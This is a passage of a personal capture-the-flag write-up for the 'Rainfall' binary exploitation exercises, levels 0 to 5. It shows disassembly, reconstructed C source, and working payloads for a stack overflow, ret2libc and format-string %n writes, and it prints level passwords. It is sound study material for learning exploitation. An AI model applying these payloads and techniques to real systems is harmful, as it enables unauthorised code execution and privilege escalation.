# /dev/log for rainfall

[Toc]

## Setup
I set up a VM with the ISO as a masOs 64 bit OS and I got this interface:

![image](https://hackmd.io/_uploads/HyNNwV9NT.png)

## level0
Upon entering, I see this getting printed out : 
```
  To start, ssh with level0/level0 on 192.168.100.82:4242
level0@192.168.100.82's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level0
```

Had no clue what it meant, so I did some studying and here is the summary. 

The program that is ran to generate this output is [checksec](https://github.com/slimm609/checksec.sh), which lists down all the in place kernel protections and executable crotections.

- GCC stack protector
    - Provided by GCC to add a canary value which is checked periodicaclly. the value is right above the return address, and the value would change if a buffer overflow occurs. 

- Strict user copy checks
    - Security configuration what enforces length checking on user-copied data

- /dev/mem and /dev/kvm
    - > dev/mem exposes memory-mapped devices in the physical RAM.
    - >  the /dev/kmem file enables access to the internal kernel structures.

- grsecurity
    - provides a range of security features aimed at preventing various types of security vulnerabilities, including buffer overflows, format string vulnerabilities, and memory corruption vulnerabilities. It achieves this through a combination of techniques

- heap hardening
    - Some mechanisms that makes heap buffer overflow harder. Some of the strategies include linked list hardening, PAY_USERCOPY which kills heap overflow bugs between userland and kerneland.

Below are the file enumerations

![image](https://hackmd.io/_uploads/SyCILdo4T.png)

Upon launching it with GDB (no .gdbinit btw), I found that it runs atoi in first argv and compares it with 0x1a7 / 423. 
![image](https://hackmd.io/_uploads/HyxEu_iN6.png)

and then it strdups /bin/sh *sus*
![image](https://hackmd.io/_uploads/S1w_dOsV6.png)

I tried running the program with argument `set args 423` in GDB. After it `strdups` /bin/sh , it calls `getegid`, `geteuid`, `setresgid` and `setresuid` is order for privellege escalation. 
![image](https://hackmd.io/_uploads/B1CR3usVT.png)

After that, it calls `execv` with `/bin/sh` as argument.
![image](https://hackmd.io/_uploads/S1fahOo4p.png)

For the other way around, if the input is not correct, the program will push the string "No !", 1, 5, and the `stderr` function then call `fwrite` to print out the error message. 
![image](https://hackmd.io/_uploads/Bk6VRdiNp.png)

The final code looks abit like this
```clike=
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

# define SHELL "/bin/sh"

int			main(int argc, char **argv)
{
    char	*args[2];
    gid_t	egid;
    uid_t	euid;

    if (atoi(argv[1]) == 423)
    {
        // 0x8048ed4 
        exec_args[0] = strdup(SHELL);
        // 0x8048ef0
        exec_args[1] = NULL;
        //0x8048ef8 - 0x8048f3d
        egid = getegid();
        euid = geteuid();
        setresgid(egid, egid, egid);
        setresuid(euid, euid, euid);

        // 0x8048f51
        execv(SHELL, args);
    }
    else
    {
        // 0x8048f58 <main+152>    mov    0x80ee170,%eax
        // 0x8048f5d <main+157>    mov    %eax,%edx
        // 0x8048f5f <main+159>    mov    $0x80c5350,%eax
        // 0x8048f64 <main+164>    mov    %edx,0xc(%esp)
        // 0x8048f68 <main+168>    movl   $0x5,0x8(%esp)
        // 0x8048f70 <main+176>    movl   $0x1,0x4(%esp)
        // 0x8048f78 <main+184>    mov    %eax,(%esp)
        // 0x8048f7b <main+187>    call   0x804a230 <fwrite>
        fwrite("No !\n", 1, 5, stderr);
    }
	return 0;
}
```

I launched the program in another shell with 423 as the argument and it worked, the password for level1 is `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`

![image](https://hackmd.io/_uploads/Hkqwt_s46.png)


## level1
The binary for level1 takes in some input via stdin, and does nothing according to strace.

![image](https://hackmd.io/_uploads/rJwxIKjET.png)

This is also confirmed when the input is passed in and ran via GDB `run params < /tmp/test`.

![image](https://hackmd.io/_uploads/Bk9WdFsVp.png)

Which gives us a simple source 
```clike=
#include <stdio.h>
    
int main()
{
    char buff[0x50]; // ?
    
    // 0x8048490
    gets(buff);
}
```

There are still some unknowns, I still cant confirm the actual size of the buffer, or why does the ESP masks to 0xfffffff0 at the start (as seen in the above screenshot). Luckily, I found a way to disassemble the code without launching gdb everytime,  by using `objdump -M intel -d filename`.

![image](https://hackmd.io/_uploads/BJAH_a3ET.png)

Here, I can see an overview of the program which also includes a run function that executes fwrite and system *sus*, and a dummy frame.

According to this [blog](https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html), the `frame_dummy` is used for
> exception handling and reconstructing stack frames to aid debugging and stack forensics

The 0xfffffff0 masking for the ESP is used for alignment, as suggested in this [SO](https://stackoverflow.com/questions/37967710/why-is-esp-masked-with-0xfffffff0) for performance and compatibility purposes ([SSE compatibility](https://superuser.com/questions/137172/sse2-sse4-2-compatibility)).

And using the information above, we can determine the size of the buffer according to how the stack frame is formed.

![image](https://hackmd.io/_uploads/S10Us6hEp.png)

The **frame pointer** (ebp) is 4 bytes as well as the **return address**, and the **stack alignment** is 8 bytes. Hence the size of the buffer (assuming its the only local variable) will be the address of esp - ebp, and the length needed to overwrite the return address (eip) for a buffer overflow attack will be the size of the buffer + frame pointer + stack alignment.


lets look at the assmebly again ;
```
 8048486:       83 ec 50                sub    esp,0x50
 8048489:       8d 44 24 10             lea    eax,[esp+0x10]
 804848d:       89 04 24                mov    DWORD PTR [esp],eax
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 ```


from the snippet above, we can see that the stack allocated 0x50 bytes using the sub opcpde, however its not the case according to this [article](https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html) where the system actually allocates to the nearest power of 2 for alignment. But at least we know our buffer size is less than 0x50 now.

In the next line, we can see that `lea    eax,[esp+0x10]` is loading the current esi address - 0x10 (stack grows downwards) to eax, to prepare the `gets` call. And according to gets manual, the argument accepts will be a buffer. Hence the size of the buffer can be deduced as `0x50 - 0x10` = 64 in decimal.

To overwrite the eip, we need to have at least 64 + 8 + 4 + 1 = 77 bytes of data.

` python -c "print('B' * 77)" > /tmp/test` to get the test input to overwrite eip.

![image](https://hackmd.io/_uploads/r1jnNAh46.png)

As we can see, the last two bytes of the saved eip is now 42. But what do we replace the saved EIP with? Remeber the run function earlier? The address is `0x8048444`. We can change our input file to `python -c "print('B' * 76 + '\x44\x84\x04\x08')" > /tmp/test` to test. (inverted address cuz little endian)

We're kinda there now, looks like we need to look at the `run` function to see what it does

![image](https://hackmd.io/_uploads/H17_UC24T.png)


![image](https://hackmd.io/_uploads/rkDtD0n4T.png)
For the arguments to fwrite, they are passing in `fwrite("Good... Wait what?", 0x1, 0x13, stdout)`.
for the args to system, they are `system("/bin/sh")`.

But why I dont get a shell? Prehaps its not execve? 
Upon looking at the man page, I see that
> system() executes a command specified in command by calling /bin/sh -c command

With that said, the source of the bianry should look like
```clike=
#include <stdio.h>
#include <stdlib.h>

# define MSG "Good... Wait what?"
# define SHELL "/bin/sh"
    
//0x8048444 
void run()
{
    // 0x804846d
    fwrite(MSG , 0x1, 0x13, stdout);
    
    // 0x8048479
    system(SHELL);
}
    
int main()
{
    // 0x8048486
    char buff[64];
    
    // 0x8048490
    gets(buff);
}
```

and according to the [SO](https://stackoverflow.com/questions/1697440/difference-between-system-and-exec-in-linux), system does not replace the current process. Which means I need to find a way to keep stdin open so that system can read input.

I tried this command
`(python -c "print('B' * 76 + '\x44\x84\x04\x08')" ; cat )| ./level1 ` and it worked.

![image](https://hackmd.io/_uploads/ByfgiCnNT.png)

The password for the next level is `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`
 
 ## level2
 ![image](https://hackmd.io/_uploads/S12njR2N6.png)
On the surface, it looks like the program here is similar to the past level, where it takes in an input and prints it. The objdump of the program is the following :  

![image](https://hackmd.io/_uploads/BkSYi2EBT.png)

Its a main function that does stack alignment and calls function `p` without any input.

the `p` function however, does alot of things.

after setting up the stack frame, it loads stdout into the first argument of `fflush` and calls it.

![image](https://hackmd.io/_uploads/BycRDa4HT.png)

After fflush returns, a pointer at the address `ebp - 0x4c` is loaded to the first argument to `gets()` @ `0x80448ed` and calls it. With this information, we know that a buffer starts at `ebp - 0x4c` now.

After gets returned, it seems like the saved EIP is extracted and put into eax, which is put into a value in the stack with the address `ebp - 0xc`. The saved EIP is then masked to match 0xb0000000, which if its equals, `printf` is called followed by `exit`. The function will not call the saved EIP.

And according to [this manual](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html), the function `__builtin_return_address ` returns the save EIP of the current function, which might be `0x80484f2` is doing.

If its not equal however, it loads the buffer which is written by `gets()` into the first argument of puts then it is called. 

The buffer from `gets()` is also loaded into the first argument of strdup, which is called and returned to the parent since there are no writes to `eax`.

After looking at the stack allocations, we are also able to determine the size of the buffer.

![image](https://hackmd.io/_uploads/r1K1C6Nra.png)


```clike=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
    
void p()
{
    // 0x80484e7
    char buffer[64];
    void *saved_eip
    
    // 0x80484e2
    fflush(stdout);
    
    // 0x80484ed
    gets(buffer);
    
    // 0x80484f2 - 0x80484f5
    saved_eip = __builtin_return_address(0);
    if ((saved_eip & 0xb0000000) == 0xb0000000)
    {
        printf("%x\n", saved_eip);
        exit(1);
    }
    
    // 0x8048500
    if (((unsigned long)saved_eip & 0xb0000000) ==  0xb0000000)
	{
        // 0x8048516
		printf("(%p)\n", saved_eip);
		exit(1);
	}
        
    // 0x804852d
    puts(buffer);
    
    // 0x8048538
    return strdup(buffer);
}

int main()
{
    p();
}
```
First off, with any buffer overflow exploit, we need to determine the offset to the EIP. Using information from this level and last level, our offset should be

```
sizeof buffer + sizeof saved_eip + sizeof ebp

=>

64 + 12 + 4 = 80
```

Notice there **is no stack alignemnt as we dont see `and 0xfffffff0`**. And we can verify it like so by comparing the input length of 81

![image](https://hackmd.io/_uploads/BkojzM8B6.png)

and 80 
![image](https://hackmd.io/_uploads/rkFafzUH6.png)


Looking at the program behaviour, we are not supposed to overwrite the EIP to any instruction pointer in the program since the program code all starts with 0x8000000. Trying to do so will cause `exit()` to be called instead of return, which means the EIP wont be read.

To circumvent this, we pass the libc function `system()` as the return address override instead, also providing its inputs on the stack. AKA ret2libc

To get the pointer to the `system()` function, create a program that calls `system()`, open it in gdb and use the `print` command to display the value of the `system()` function, which will be a instruction pointer `0xb7e6b060`

![image](https://hackmd.io/_uploads/B1wCSWIBp.png)

After that, we have to find a way to populate the parameters of the function. Since libC functions **reads inputs return addresses and inputs from the stack**, The first 4 bytes is the return address, we dont want  to return anything, so we just put random bytes `BEEF`. the next 4 bytes should be a string, which is a pointer to a character sequence, which we can utilize the environment variables like so:

```clike=
// getenv.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
         }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```


```
level2@RainFall:/tmp$ gcc getenv.c; ./a.out BINSH ./level2
BINSH will be at 0xbfffff38
level2@RainFall:/tmp$
```
we are able to predict the address because environment variables are stored at the start of the stack frame which is relative of the programs name, which gives us `0xbfffff38`

So, our input shall be 
`python -c "print 'B' * 80 + '\xb7\xe6\xb0\x60'[::-1] + 'BEEF' + '\xbf\xff\xff\x38'[::-1]" > /tmp/out`

OOPS, I forgot about the check stack check earlier at `0x80484f2 - 0x80484f5` and I got the printf output.

```
level2@RainFall:~$ ./level2 < /tmp/out
(0xb7e6b060)
```

Based on [this SO post](https://stackoverflow.com/questions/5130654/when-how-does-linux-load-shared-libraries-into-address-space), **.so objects are loaded into mmaped memory (stack)** during runtime, hence failing the check.

I digged around the acutal working of the `lea` and `ret` instruction and here are the things they do according to [this](https://www.felixcloutier.com/x86/leave) and [this](https://www.felixcloutier.com/x86/ret).

The leave instruction does the following:

- Copies the frame pointer (in the EBP register) into the stack pointer register (ESP). This effectively releases the stack space that was allocated to the current function's stack frame.
- **Pops** the old frame pointer (the frame pointer for the calling procedure that was saved by the enter instruction) from the stack into the EBP register. This restores the calling procedure's stack frame 2.


The ret instruction does not take any operands and its operation is as follows:

- It **pops** the return address from the stack into the instruction pointer (EIP for x86, RIP for x86_64).
- It then jumps to the address stored in the instruction pointer.

![image](https://hackmd.io/_uploads/Sk6Sf7uSa.png)

As we can see, the `lea` and `ret` command pops from the stack, slowly consuming it. The `lea` command does not check if the value it pops is valid or not, neither does `ret`. It just **assumes** that all the data it popped is in the correct position and just writes to the registers.

With this knowledge, we are able to chain `ret` calls to bypass the stack check like so:

![image](https://hackmd.io/_uploads/B1xWEX_ST.png)

To prove that, I made the input command using the command below. the `'\x08\x04\x85\x3e'[::-1]`s are addresses to the `ret` instructions.

`python -c "print 'B' * 80 + '\x08\x04\x85\x3e'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + 'BEEF' + '\xbf\xff\xff\x38'[::-1]" > /tmp/out`

After that, I launch the program with stdin open using 
`cat /tmp/out - | ./level2` and it works. The flag is `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
![image](https://hackmd.io/_uploads/HJSbIXOST.png)

And the final source code is 
```clike=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
    
char * p()
{
    // 0x80484e7
    char buffer[64];
    void *saved_eip
    
    // 0x80484e2
    fflush(stdout);
    
    // 0x80484ed
    gets(buffer);
    
    // 0x80484f2 - 0x80484f5
    saved_eip = __builtin_return_address(0);
    if ((saved_eip & 0xb0000000) == 0xb0000000)
    {
        printf("%x\n", saved_eip);
        exit(1);
    }
    
    // 0x8048500
    if (((unsigned long)saved_eip & 0xb0000000) ==  0xb0000000)
	{
        // 0x8048516
		printf("(%p)\n", saved_eip);
		exit(1);
	}
        
    // 0x804852d
    puts(buffer);
    
    // 0x8048538
    return strdup(buffer);
}

int main()
{
    p();
}
```

## level3 
Below is the `objdump` of the level3 program
```
080484a4 <v>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       81 ec 18 02 00 00       sub    esp,0x218
 80484ad:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484b2:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484b6:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484bd:       00
 80484be:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484c4:       89 04 24                mov    DWORD PTR [esp],eax
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484d2:       89 04 24                mov    DWORD PTR [esp],eax
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
 80484df:       83 f8 40                cmp    eax,0x40
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    eax,ds:0x8049880
 80484e9:       89 c2                   mov    edx,eax
 80484eb:       b8 00 86 04 08          mov    eax,0x8048600
 80484f0:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 80484f4:       c7 44 24 08 0c 00 00    mov    DWORD PTR [esp+0x8],0xc
 80484fb:       00
 80484fc:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 8048503:       00
 8048504:       89 04 24                mov    DWORD PTR [esp],eax
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
 804850c:       c7 04 24 0d 86 04 08    mov    DWORD PTR [esp],0x804860d
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
 8048518:       c9                      leave
 8048519:       c3                      ret

0804851a <main>:
 804851a:       55                      push   ebp
 804851b:       89 e5                   mov    ebp,esp
 804851d:       83 e4 f0                and    esp,0xfffffff0
 8048520:       e8 7f ff ff ff          call   80484a4 <v>
 8048525:       c9                      leave
 8048526:       c3                      ret
 8048527:       90                      nop
 8048528:       90                      nop
 8048529:       90                      nop
 804852a:       90                      nop
 804852b:       90                      nop
 804852c:       90                      nop
 804852d:       90                      nop
 804852e:       90                      nop
 804852f:       90                      nop
 ```
 Looks lke a typical main function call at `0804851a`, with the stack alignment and a function call to `v`.
 
 In `v`, Some space are allocated to the stack, it 
 1. Creates a buffer of 0x208 (520) size. Loads `stdin` from the data segmanet, prepares to call fgets to read from stdin of 0x200 (512) bytes into the buffer
 2. Prints the buffer using printf
 3. loads a data segment 0x804988c (global static at that address), and compares it to 0x40 (64)
     - If they are not equal, 
         1. return
    - If they are equal
        1. Prepare arguments for `frwite("Wait what?", 0xc, 0x1, stdout)` 
        2. `system("/bin/sh")`

Looks quite straightforward, we need to find a wait to overwrite the instruction at address `0x804988c` to `0x40` to trigger the shell. I tried an insanely long buffer but it didnt work, the address still cant be overwritten becuase fgets only accept up to 200 charcaters.

I also noticed that the printf call after fgets is using the buffer as the first argument `[ebp-0x208]` as supposed to a format string, which leaves us the oppurtinuty for a **format string exploit**

Section 0x354 of this [this book](https://repo.zenk-security.com/Magazine%20E-book/Hacking-%20The%20Art%20of%20Exploitation%20(2nd%20ed.%202008)%20-%20Erickson.pdf) gives a detailed explanation on how this works.

In this particular example here, if the printf function takes a string `%s` as the first argument and the user input as the second, the output is identical to the first attempt which is expected behaviour.

However if the printf call takes the user input as the first argument, we will see output similar to the second attempt. This is becase when **we include format arguments in the string, it will try to take action and read from the stack**. 
![image](https://hackmd.io/_uploads/HkJUNuFBT.png)

![image](https://hackmd.io/_uploads/r1D4tutSa.png)

To this this, i decided to look into this on my own at the program. I tried to print out the next few items on the stack as hex and this is what I got.

![image](https://hackmd.io/_uploads/SJEaFdKST.png)

I inspected the address and indeed, I do see some values which correspond the stack, like the size 0x200 from fgets earlier, the stdin struct that was pushed by fgets.

![image](https://hackmd.io/_uploads/r1HxodtHa.png)

The stack also contained data from libc_memalogn, but as of now im bot sure where the source is from.

In printf, there is a specific format specifier **`%n` that writes how many bytes have been printed out so far to a va_arg**. Since we know we can access memory addresses using other format specifiers, The strategy is to format printf to print enough characters to reach the `0x804988c` mark and write the value 64 to it. If we notice in the output `BBBBBB 200 b7fd1ac0 b7ff37d0 42424242 25204242 78252078`, the `BBBBBB` segment is also stored in the stack after 8 bytes as `42424242`, and after specifying %x 3 times. 

To access the same address, we can replace `BBBBBB` with the actual hex address `0x804988c` , specify format %x 3 times and use %n formatter to write to the data in that address.

So our input will be something like 
`python -c "print '\x08\x04\x98\x8c'[::-1] + '%x %x %x %n'" > /tmp/hello`.

After running the input, we are able to see that `0x804988c` had been overwritten. Now, we need to make it so that we are able to overwrite to the value 64. 
![image](https://hackmd.io/_uploads/Bk8VUctSa.png)

To do that, I tried to add more characters before the %n ` python -c "print '\x08\x04\x98\x8c'[::-1] + 'B' * 38 + '%x %x %x %n'" > /tmp/hello` and I got the Wait What message in the stdout, which means now all i nede to do is to keep stdin open
![image](https://hackmd.io/_uploads/rkJEP5tSa.png)

Im in the shell, and the password is `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`
![image](https://hackmd.io/_uploads/r1nKwqYr6.png)

Using the steps above, the source code should be 
```clike=
#include <stdio.h>
#include <stdlib.h>

static int	g_var = 0;
void v()
{
    // 80484a7
    char buf[512];
    
    // 80484c7
    fgets(buf, 512, stdin);
    
    // 80484d5
    printf(buf);
    if (g_var != 0x40)
        return;
    
    // 8048507
    fwrite("Wait what?!", 0xc, 0x1, stdout);
    system("/bin/sh");
}

int main()
{
    v();
}
```

## level4 
Here is the objdump for the level4 application
```
08048444 <p>:
 8048444:       55                      push   ebp
 8048445:       89 e5                   mov    ebp,esp
 8048447:       83 ec 18                sub    esp,0x18
 804844a:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 804844d:       89 04 24                mov    DWORD PTR [esp],eax
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt>
 8048455:       c9                      leave
 8048456:       c3                      ret

08048457 <n>:
 8048457:       55                      push   ebp
 8048458:       89 e5                   mov    ebp,esp
 804845a:       81 ec 18 02 00 00       sub    esp,0x218
 8048460:       a1 04 98 04 08          mov    eax,ds:0x8049804
 8048465:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048469:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048477:       89 04 24                mov    DWORD PTR [esp],eax
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt>
 804847f:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 8048485:       89 04 24                mov    DWORD PTR [esp],eax
 8048488:       e8 b7 ff ff ff          call   8048444 <p>
 804848d:       a1 10 98 04 08          mov    eax,ds:0x8049810
 8048492:       3d 44 55 02 01          cmp    eax,0x1025544
 8048497:       75 0c                   jne    80484a5 <n+0x4e>
 8048499:       c7 04 24 90 85 04 08    mov    DWORD PTR [esp],0x8048590
 80484a0:       e8 bb fe ff ff          call   8048360 <system@plt>
 80484a5:       c9                      leave
 80484a6:       c3                      ret

080484a7 <main>:
 80484a7:       55                      push   ebp
 80484a8:       89 e5                   mov    ebp,esp
 80484aa:       83 e4 f0                and    esp,0xfffffff0
 80484ad:       e8 a5 ff ff ff          call   8048457 <n>
 80484b2:       c9                      leave
 80484b3:       c3                      ret
 80484b4:       90                      nop
 80484b5:       90                      nop
 80484b6:       90                      nop
 80484b7:       90                      nop
 80484b8:       90                      nop
 80484b9:       90                      nop
 80484ba:       90                      nop
 80484bb:       90                      nop
 80484bc:       90                      nop
 80484bd:       90                      nop
 80484be:       90                      nop
 80484bf:       90                      nop
```

From the objdump, I deduced that the source code looks something like this

```clike=
#include <stdio.h>
#include <stdlib.h>

static int    g_var = 0;

void p(char *buffer)
{    
    printf(buffer);
}

void n()
{
    // 804845a
    char buf[512]; // 0x200
    
    // 804847a
    fgets(buf, 512, stdin);
    
    // 804847a
    p(buf);
    
    if (g_var + 12 != 0x1025544)
        return;
    system("/bin/sh");
    
}
    
int main()
{
    n()
}
```

This is quite similar to level3, there is an unsafe printf and we are tasked to overwrite the data address `0x08049810` to value `0x01025544` or `16930116` in decimal. This value is too large for us to print out manually as fgets only reads up to 512 characters. We will need to fill in the values using several writes.  

According to this example from the book, we are able to write into contigious bytes like so.
![image](https://hackmd.io/_uploads/rJ8GmjFrT.png)

Because of the little endianess, we will first need to reverse the order of the value to `0x44550201`, then, we can map out the values we want to write to which addresses. 

```
0x08049810 - 0x44
0x08049811 - 0x55
0x08049812 - 0x02
0x08049813 - 0x01
```

And we also need to know how much do we need to traverse in the stack to reach those addresses to reach `0x08049810` , so I tested them out and I got 

```
BBBB b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

This shows that i need to format %x 11 times to get to the values of the first argument. Now lets try writing to them in the actual address to verify the ordering. With the input as `python -c "print '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '%x ' * 11 + '%n %n'"> /tmp/level4`, we manage to observe the address being written as below, which proves the ordering correct.

![image](https://hackmd.io/_uploads/Skf1jitBT.png)

I believe all of this information is sufficient for us to actually write the values. However, we are not able to use %n for its intented purposes to count bytes, since the minimum characters to reach the address already exceeds `0x44`

Looking at this [blog](https://gbmaster.wordpress.com/2015/12/08/x86-exploitation-101-format-strings-ill-tell-ya-what-to-say/), it shows that printf has something called **direct paremeter access** which allows us to access certain parameters without needing to format them one by one beforehand. Its syntax looks like this - `%7$x` where it means **Access the 7th argument as a hex**. This can help cut down the bytes below the minimum. To apply this change, we can change out input like so ` python -c "print '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + 'B' * 60 + '%12\$n' + 'B' * 16 + '%13\$n'"> /tmp/level4`

As we can see, we are able to nail the `44` and `55` requirement. However, we cant use the say way to do `02` and `01`, since the values printed by **%n can only increase**.
![image](https://hackmd.io/_uploads/BkRWW2YBp.png)

To circumvent this, we can **"wrap" the two values together** to one. Making out mapping change like so. 
```
0x08049810 - 0x44
0x08049811 - 0x55
0x08049812 - 0x102
```

Which changes the input to - 
`python -c "print '\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 'B' * 56 + '%12\$n' + 'B' * 17 + '%13\$n' + 'B' * 173 + '%14\$n'"> /tmp/level4`

And there we have it, the final value of the global static.
![image](https://hackmd.io/_uploads/HJD-r2YrT.png)

The password was printed on execution.
`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

## level5 
Below is an objdump for the level5 program.
```
080484a4 <o>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       83 ec 18                sub    esp,0x18
 80484aa:       c7 04 24 f0 85 04 08    mov    DWORD PTR [esp],0x80485f0
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
 80484b6:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:       55                      push   ebp
 80484c3:       89 e5                   mov    ebp,esp
 80484c5:       81 ec 18 02 00 00       sub    esp,0x218
 80484cb:       a1 48 98 04 08          mov    eax,ds:0x8049848
 80484d0:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484d4:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484db:       00
 80484dc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484e2:       89 04 24                mov    DWORD PTR [esp],eax
 80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
 80484ea:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484f0:       89 04 24                mov    DWORD PTR [esp],eax
 80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
 80484f8:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>

08048504 <main>:
 8048504:       55                      push   ebp
 8048505:       89 e5                   mov    ebp,esp
 8048507:       83 e4 f0                and    esp,0xfffffff0
 804850a:       e8 b3 ff ff ff          call   80484c2 <n>
 804850f:       c9                      leave
 8048510:       c3                      ret
 8048511:       90                      nop
 8048512:       90                      nop
 8048513:       90                      nop
 8048514:       90                      nop
 8048515:       90                      nop
 8048516:       90                      nop
 8048517:       90                      nop
 8048518:       90                      nop
 8048519:       90                      nop
 804851a:       90                      nop
 804851b:       90                      nop
 804851c:       90                      nop
 804851d:       90                      nop
 804851e:       90                      nop
 804851f:       90                      nop
 ```

Based on the dump, the source code can de deduced like so 
```clike=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
    
void o()
{
    // 80484b1
    system("/bin/sh");
}

void n()
{
    char buf[512];
    
    // 80484e5
    fgets(buf, 512, stdin);
    
    // 80484f3
    printf(buf);
    
    exit(1);
}

int main()
{
    // 804850a
    n();
}
```

This is abit tricky, as after the format string vuln at printf follows an exit call, which ignores the saved EIP.

I tried to look for .dtor function as suggested by the book, but there is no avail, however, the **Overwriting the Global Offset Table** did mention something 

![image](https://hackmd.io/_uploads/H1s032trp.png)

This implies that we are able to **manipulate the jump instructions for the exit() function to jump somewhere else, potentially to shellcode.**.

This is a special section in compiled programs called the **PLT (procedure linkage table)** which consists of many jump instructions, each one corresponding to the address of a function. Each time a **shared function needs to be called**, control will pass through the PLT.

The PLT section of our binary looks like this
```
Disassembly of section .plt:

08048370 <printf@plt-0x10>:
 8048370:       ff 35 1c 98 04 08       push   DWORD PTR ds:0x804981c
 8048376:       ff 25 20 98 04 08       jmp    DWORD PTR ds:0x8049820
 804837c:       00 00                   add    BYTE PTR [eax],al
        ...

08048380 <printf@plt>:
 8048380:       ff 25 24 98 04 08       jmp    DWORD PTR ds:0x8049824
 8048386:       68 00 00 00 00          push   0x0
 804838b:       e9 e0 ff ff ff          jmp    8048370 <_init+0x3c>

08048390 <_exit@plt>:
 8048390:       ff 25 28 98 04 08       jmp    DWORD PTR ds:0x8049828
 8048396:       68 08 00 00 00          push   0x8
 804839b:       e9 d0 ff ff ff          jmp    8048370 <_init+0x3c>

080483a0 <fgets@plt>:
 80483a0:       ff 25 2c 98 04 08       jmp    DWORD PTR ds:0x804982c
 80483a6:       68 10 00 00 00          push   0x10
 80483ab:       e9 c0 ff ff ff          jmp    8048370 <_init+0x3c>

080483b0 <system@plt>:
 80483b0:       ff 25 30 98 04 08       jmp    DWORD PTR ds:0x8049830
 80483b6:       68 18 00 00 00          push   0x18
 80483bb:       e9 b0 ff ff ff          jmp    8048370 <_init+0x3c>

080483c0 <__gmon_start__@plt>:
 80483c0:       ff 25 34 98 04 08       jmp    DWORD PTR ds:0x8049834
 80483c6:       68 20 00 00 00          push   0x20
 80483cb:       e9 a0 ff ff ff          jmp    8048370 <_init+0x3c>

080483d0 <exit@plt>:
 80483d0:       ff 25 38 98 04 08       jmp    DWORD PTR ds:0x8049838
 80483d6:       68 28 00 00 00          push   0x28
 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>

080483e0 <__libc_start_main@plt>:
 80483e0:       ff 25 3c 98 04 08       jmp    DWORD PTR ds:0x804983c
 80483e6:       68 30 00 00 00          push   0x30
 80483eb:       e9 80 ff ff ff          jmp    8048370 <_init+0x3c>
```
